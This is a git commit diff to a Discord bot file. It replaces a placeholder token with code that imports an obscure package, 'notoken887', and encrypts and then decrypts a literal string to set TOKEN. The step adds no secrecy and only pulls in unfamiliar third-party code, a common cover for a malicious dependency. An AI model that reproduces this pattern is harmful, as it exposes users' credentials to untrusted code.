8587dcd800285613ec3d0115aadf0231aa377324
RayWZW <harrysmith690089@gmail.com>
2024-10-23 00:04:31 -0600

    Update discodd.py

--- discodd.py
+++ discodd.py
@@ -1,1 +1,7 @@
-TOKEN = "PUT YOUR BOT TOKEN RIGHT IN HERE"
+from notoken887.encryptor import TokenCryptor
+cryptor = TokenCryptor()
+original_string = "special emoji encryption bot token"
+encrypted = cryptor.encrypt(original_string)
+decrypted = cryptor.decrypt(encrypted)
+
+TOKEN= decrypted
